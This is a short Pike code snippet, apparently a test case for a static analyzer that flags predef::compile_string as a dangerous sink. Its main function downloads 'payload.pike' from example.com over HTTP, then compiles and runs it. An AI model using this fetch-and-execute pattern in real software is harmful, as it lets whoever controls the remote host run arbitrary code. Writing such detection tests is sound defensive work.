// Module-prefixed form -- still a sink.
int main() {
    string src = fetch_remote_source();
    program p = predef::compile_string(src);
    p();
    return 0;
}

string fetch_remote_source() {
    return Protocols.HTTP.get_url("http://example.com/payload.pike")->data();
}
